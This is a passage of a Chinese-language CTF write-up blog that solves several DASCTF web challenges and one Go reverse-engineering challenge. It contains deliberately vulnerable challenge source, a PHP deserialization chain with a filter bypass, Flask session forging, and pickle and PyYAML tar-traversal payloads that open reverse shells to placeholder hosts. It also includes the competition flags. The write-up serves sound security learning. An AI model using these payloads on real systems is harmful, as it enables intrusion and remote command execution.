class="variable">$this</span>-&gt;now[<span class="variable">$name</span>], <span class="variable">$ary</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ycb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;now = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;finish-&gt;finish;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cheng</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$finish</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;name[<span class="variable">$value</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bei</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;CTF-&gt;<span class="title function_ invoke__">ycb</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;fine-&gt;<span class="title function_ invoke__">YCB1</span>(<span class="variable">$this</span>-&gt;rce, <span class="variable">$this</span>-&gt;rce1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prohib</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&quot;CTF&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">  <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">prohib</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># ./有hint.zip</span></span><br></pre></td></tr></table></figure><p>分析构造反序列化链，由 <code>Bei:__destruct()</code> 开始，调用到 <code>Yang:__call()</code> 中的 <code>call_user_func()</code> 函数RCE：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Yang</span>:</span><br><span class="line">    public_finish=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Yang</span>:</span><br><span class="line">    public_finish=Yang()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Yang</span>:</span><br><span class="line">    public_finish=Yang()</span><br><span class="line">    public_now=&#123;<span class="string">&#x27;YCB1&#x27;</span>:<span class="string">&#x27;system&#x27;</span>&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bei</span>:</span><br><span class="line">    public_CTF=Yang()</span><br><span class="line">    public_fine=Yang()</span><br><span class="line">    public_rce=<span class="string">&#x27;cat /tmp/catcatf1ag.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(serialize(Bei()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O:3:&quot;Bei&quot;:3:&#123;s:3:&quot;CTF&quot;;O:4:&quot;Yang&quot;:2:&#123;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;i:1;&#125;&#125;s:3:&quot;now&quot;;a:1:&#123;s:4:&quot;YCB1&quot;;s:6:&quot;system&quot;;&#125;&#125;s:4:&quot;fine&quot;;O:4:&quot;Yang&quot;:2:&#123;s:6:&quot;finish&quot;;r:3;s:3:&quot;now&quot;;a:1:&#123;s:4:&quot;YCB1&quot;;s:6:&quot;system&quot;;&#125;&#125;s:3:&quot;rce&quot;;s:23:&quot;cat /tmp/catcatf1ag.txt&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>双写system绕过关键词过滤，POST传参：</p><p><code>CTF=O:3:&quot;Bei&quot;:3:&#123;s:3:&quot;CTF&quot;;O:4:&quot;Yang&quot;:2:&#123;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;i:1;&#125;&#125;s:3:&quot;now&quot;;a:1:&#123;s:4:&quot;YCB1&quot;;s:6:&quot;systsystemem&quot;;&#125;&#125;s:4:&quot;fine&quot;;O:4:&quot;Yang&quot;:2:&#123;s:6:&quot;finish&quot;;r:3;s:3:&quot;now&quot;;a:1:&#123;s:4:&quot;YCB1&quot;;s:6:&quot;systsystemem&quot;;&#125;&#125;s:3:&quot;rce&quot;;s:23:&quot;cat /tmp/catcatf1ag.txt&quot;;&#125;</code></p><p>得到flag：<code>DASCTF&#123;54675642781313253235583695043371&#125;</code>。</p><p>​    </p><h3 id="Serpent"><a href="#Serpent" class="headerlink" title="Serpent"></a>Serpent</h3><blockquote><p> I have been endeavoring to Reduce my phobia of Serpents by learning more about them. Do not scan, note that there is a www.zip file under the website.</p></blockquote><p>尝试解flask session：</p><p><code>flask-unsign --decode --cookie &#39;eyJBdHRyaWJ1dGUiOnsiYWRtaW4iOjAsIm5hbWUiOiJHV0hUIiwic2VjcmV0X2tleSI6IkdXSFR4Y3VMeGhWZVFBIn19.ZPLWRw.5YHps4KX1FfZNY5xe9-25Nckl7s&#39;</code></p><p>得：<code>&#123;&#39;Attribute&#39;: &#123;&#39;admin&#39;: 0, &#39;name&#39;: &#39;GWHT&#39;, &#39;secret_key&#39;: &#39;GWHTxcuLxhVeQA&#39;&#125;&#125;</code></p><p>包含secret_key，修改为：<code>&#123;&#39;Attribute&#39;: &#123;&#39;admin&#39;: 1, &#39;name&#39;: &#39;admin&#39;, &#39;secret_key&#39;: &#39;GWHTxcuLxhVeQA&#39;&#125;&#125;</code>，加密后改cookie：</p><p><code>flask-unsign --sign --cookie &quot;&#123;&#39;Attribute&#39;: &#123;&#39;admin&#39;: 1, &#39;name&#39;: &#39;admin&#39;, &#39;secret_key&#39;: &#39;GWHTxcuLxhVeQA&#39;&#125;&#125;&quot; --secret &#39;GWHTxcuLxhVeQA&#39;</code></p><p>得到提示：<code>Hello admin, welcome to /ppppppppppick1e</code>。</p><p>访问 <code>ppppppppppick1e</code> 路由，在Header发现：<code>Hint: Source in /src0de</code>，得到源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/src0de&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">src0de</span>():</span><br><span class="line">    f = <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    rsp = f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> rsp[rsp.index(<span class="string">&quot;@app.route(&#x27;/src0de&#x27;)&quot;</span>):]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ppppppppppick1e&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ppppppppppick1e</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">        rsp = make_response(<span class="string">&quot;Hello, %s &quot;</span> % username)</span><br><span class="line">        rsp.headers[<span class="string">&#x27;hint&#x27;</span>] = <span class="string">&quot;Source in /src0de&quot;</span></span><br><span class="line">        pick1e = request.cookies.get(<span class="string">&#x27;pick1e&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> pick1e <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            pick1e = base64.b64decode(pick1e)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> rsp</span><br><span class="line">        <span class="keyword">if</span> check(pick1e):</span><br><span class="line">            pick1e = pickle.loads(pick1e)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Go for it!!!&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No Way!!!&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        error_message = <span class="built_in">str</span>(e)</span><br><span class="line">        <span class="keyword">return</span> error_message</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rsp</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GWHT</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>python反序列化，测试发现禁用R指令，参考<a href="https://zhuanlan.zhihu.com/p/89132768">这里</a>使用不带R指令的RCE payload：</p><p><code>b&#39;\x80\x03c__main__\nGWHT\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVbash -c &quot;bash -i &gt;&amp; /dev/tcp/[IP]/[Port] 0&gt;&amp;1&quot;\nb.&#39;</code></p><p>base64编码后给cookie中的 <code>pick1e</code> 赋值，成功反弹shell。</p><p>读根目录下flag发现无权限，查看SUID可执行文件：</p><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>，</p><p>发现 <code>/usr/bin/python3.8</code>，执行 <code>python3.8 -c &quot;print(open(&#39;/flag&#39;).read())&quot;</code> 读到flag：<code>DASCTF&#123;62339708167284198788958643730094&#125;</code>。</p><p>​    </p><h3 id="ArkNights"><a href="#ArkNights" class="headerlink" title="ArkNights"></a>ArkNights</h3><blockquote><p>Fantasy world full of magic and dream…………….</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] =<span class="built_in">str</span>(uuid.uuid4()).replace(<span class="string">&quot;-&quot;</span>,<span class="string">&quot;*&quot;</span>)+<span class="string">&quot;Boogipopisweak&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name=request.args.get(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;name&quot;</span>)</span><br><span class="line">    m1sery=[request.args.get(<span class="string">&quot;m1sery&quot;</span>,<span class="string">&quot;Doctor.Boogipop&quot;</span>)]</span><br><span class="line">    <span class="keyword">if</span>(session.get(<span class="string">&quot;name&quot;</span>)==<span class="string">&quot;Dr.Boog1pop&quot;</span>):</span><br><span class="line">        blacklist=re.findall(<span class="string">&quot;/ba|sh|\\\\|\[|]|#|system|&#x27;|\&quot;/&quot;</span>, name, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;bad hacker no way&quot;</span></span><br><span class="line">        <span class="built_in">exec</span>(<span class="string">f&#x27;for [<span class="subst">&#123;name&#125;</span>] in [<span class="subst">&#123;m1sery&#125;</span>]:print(&quot;strange?&quot;)&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;Doctor&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,name=session.get(<span class="string">&quot;name&quot;</span>))</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">        file = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">        fileblacklist=re.findall(<span class="string">&quot;/flag|fl|ag/&quot;</span>,file, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> fileblacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;bad hacker!&quot;</span></span><br><span class="line">        start=request.args.get(<span class="string">&quot;start&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        end=request.args.get(<span class="string">&quot;end&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> start==<span class="string">&quot;0&quot;</span> <span class="keyword">and</span> end==<span class="string">&quot;0&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">open</span>(file,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            start,end=<span class="built_in">int</span>(start),<span class="built_in">int</span>(end)</span><br><span class="line">            f=<span class="built_in">open</span>(file,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">            f.seek(start)</span><br><span class="line">            data=f.read(end)</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="built_in">print</span>(os.path.pardir)</span><br><span class="line">    <span class="built_in">print</span>(path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;templates/&quot;</span> + path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> render_template(path)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">False</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><p>非预期，利用 <code>read</code> 路由读环境变量文件 <code>/proc/1/environ</code> 文件找到flag：<code>/read?file=/proc/1/environ</code>。</p><p><code>DASFLAG=DASCTF&#123;67528847472042710457227886304140&#125;</code></p><p>预期解应该是分别通过 <code>/proc/self/maps</code> 和 <code>/proc/self/mem</code> 读取堆栈分布和对应位置内存数据拿到SECRET_KEY值，再修改flask session绕黑名单RCE。</p><p>​    </p><h3 id="ezyaml"><a href="#ezyaml" class="headerlink" title="ezyaml"></a>ezyaml</h3><blockquote><p>简单得yaml</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;bytes&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;map&#x27;</span>,<span class="string">&#x27;frozenset&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;tuple&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;object&#x27;</span>,<span class="string">&#x27;listitems&#x27;</span>,<span class="string">&#x27;subprocess&#x27;</span>,<span class="string">&#x27;object&#x27;</span>,<span class="string">&#x27;apply&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> <span class="built_in">str</span>(s).lower():</span><br><span class="line">            flag= <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extractFile</span>(<span class="params">filepath, <span class="built_in">type</span></span>):</span><br><span class="line"></span><br><span class="line">    extractdir = filepath.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(extractdir):</span><br><span class="line">        os.makedirs(extractdir)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&#x27;tar&#x27;</span>:</span><br><span class="line">        tf = tarfile.TarFile(filepath)</span><br><span class="line">        tf.extractall(extractdir)</span><br><span class="line">        <span class="keyword">return</span> tf.getnames()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">        fn = <span class="string">&#x27;uploads/&#x27;</span> + md5().hexdigest()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(fn):</span><br><span class="line">            os.makedirs(fn)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        upFile = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(upFile)</span><br><span class="line">        <span class="keyword">if</span> re.search(<span class="string">r&quot;\.\.|/&quot;</span>, upFile.filename, re.M|re.I) != <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Hacker!&#x27;);window.location.href=&#x27;/upload&#x27;&lt;/script&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">        savePath = <span class="string">f&quot;uploads/<span class="subst">&#123;upFile.filename&#125;</span>&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(savePath)</span><br><span class="line">        upFile.save(savePath)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> tarfile.is_tarfile(savePath):</span><br><span class="line">            zipDatas = extractFile(savePath, <span class="string">&#x27;tar&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;result.html&#x27;</span>, path=savePath, files=zipDatas)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;upFile.filename&#125;</span> upload successfully&#x27;);history.back(-1);&lt;/script&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/src&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">src</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args:</span><br><span class="line">        username = request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;config/<span class="subst">&#123;username&#125;</span>.yaml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            Config = yaml.load(f.read())</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>, username=<span class="string">&quot;admin&quot;</span>, message=<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure></blockquote><p>开始一个上传点，根据源码知 <code>upload</code> 路由知当上传tar后缀的文件时，回执行解压代码，将文件解压到uploads目录下，利用tar目录穿越漏洞，将文件解压到config目录下，配合下一步 <code>src</code> 路由功能中存在的PyYAML漏洞（CVE-2020-1747），实现RCE。</p><p>生成tar文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">tar = tarfile.TarFile(<span class="string">r&#x27;1.tar&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">info = tarfile.TarInfo(<span class="string">&quot;../../config/my.yaml&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反弹shell</span></span><br><span class="line">deserialization_payload = <span class="string">&quot;&quot;&quot;!!python/object/apply:os.system [&#x27;bash -c &quot;bash -i &gt; /dev/tcp/[IP]/[Port] 0&gt;&amp;1 2&gt;&amp;1&quot;&#x27;]&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">info.size=<span class="built_in">len</span>(deserialization_payload)</span><br><span class="line">info.mode=<span class="number">0o777</span></span><br><span class="line"></span><br><span class="line">tar.addfile(info, io.BytesIO(deserialization_payload.encode()))</span><br><span class="line">tar.close()</span><br></pre></td></tr></table></figure><p>上传，回显解压到 <code>../../config/my.yaml</code>，<code>my.yaml</code> 已在config目录下，再访问 <code>/src?username=my</code> 反弹shell成功，执行 <code>cat /fllaagg_here</code> 得到flag：<code>DASCTF&#123;13247551631744504376506324559899&#125;</code>。</p><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="CSGO"><a href="#CSGO" class="headerlink" title="CSGO"></a>CSGO</h3><blockquote><p>Let’s Go!! </p></blockquote><p>go语言程序，找到最后比较的base64密文为：</p><p><code>cPQebAcRp+n+ZeP+YePEWfP7bej4YefCYd/7cuP7WfcPb/URYeMRbesObi/=</code></p><p>动调加密函数 <code>fkReverse_()</code> ，在码表变量 <code>fkReverse</code> 处下断点，调试得实际码表：</p><p><code>LMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJK</code></p><p>base64解密得flag：<code>DASCTF&#123;73913519-A0A6-5575-0F10-DDCBF50FA8CA&#125;</code>。</p>]]></content>
    
    
      
